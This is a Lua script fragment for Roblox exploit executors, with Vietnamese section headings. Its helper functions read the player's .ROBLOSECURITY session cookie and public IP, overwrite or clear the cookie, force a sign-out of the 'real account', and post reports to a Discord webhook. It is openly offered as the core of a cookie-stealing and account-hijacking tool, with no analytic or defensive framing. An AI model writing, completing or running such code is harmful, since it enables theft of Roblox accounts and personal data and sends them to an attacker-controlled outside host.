-- ========== 1. HÀM TIỆN ÍCH ==========
local function getIP()
    local ip = "Unknown"
    pcall(function()
        if syn and syn.request then
            local res = syn.request({Url = "https://api.ipify.org", Method = "GET"})
            ip = res.Body
        elseif game:HttpGet then
            ip = game:HttpGet("https://api.ipify.org")
        end
    end)
    return ip
end

local function getCurrentCookie()
    if getcookie then return getcookie(".ROBLOSECURITY") or "" end
    if syn and syn.cookie then return syn.cookie.get(".ROBLOSECURITY") or "" end
    return ""
end

local function setCookie(cookie)
    if syn and syn.cookie then syn.cookie.set(".ROBLOSECURITY", cookie) end
    if setcookie then setcookie(".ROBLOSECURITY", cookie) end
end

local function clearCookie()
    setCookie("")
end

local function sendToDiscord(title, fields)
    local embed = {title = title, color = 0xff0000, fields = fields, timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")}
    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode({embeds = {embed}}), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ========== 2. LOGOUT TÀI KHOẢN THẬT ==========
local function forceLogout()
    clearCookie()
    pcall(function()
        if syn and syn.request then
            syn.request({Url = "https://www.roblox.com/authentication/signout", Method = "POST"})
        end
    end)
    sendToDiscord("🚪 Forced Logout", {{name = "Status", value = "Logged out real account", inline = false}})
end

